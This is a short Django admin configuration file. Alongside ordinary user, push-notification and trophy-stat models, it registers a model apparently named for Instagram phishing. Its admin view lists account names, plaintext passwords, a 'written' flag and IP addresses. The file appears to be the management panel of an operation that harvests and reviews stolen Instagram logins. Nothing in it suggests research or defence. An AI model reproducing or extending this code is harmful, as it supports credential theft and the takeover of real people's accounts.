from django.contrib import admin

# Register your models here.
from apps.account.models import *


class CustomUserAdmin(admin.ModelAdmin):
    list_display = ['username', 'phone_number','balance_of_user', 'is_active', 'date_joined', 'rate']
    list_filter = ['is_active', 'date_joined']
    search_fields = ['username']

class AccountsInstagramPhishingAdmin(admin.ModelAdmin):
    list_display = ['name', 'password','is_written', 'ip_address']
    search_fields = ['name']

class UserTrophyStatAdmin(admin.ModelAdmin):
    list_display = ['user', 'date','trophies']

admin.site.register(CustomUser, CustomUserAdmin)
admin.site.register(PushSubscription)
admin.site.register(UserTrophyStat, UserTrophyStatAdmin)
admin.site.register(PushNotificationToSubscribedUser)
admin.site.register(AccountsInstagramPhishing, AccountsInstagramPhishingAdmin)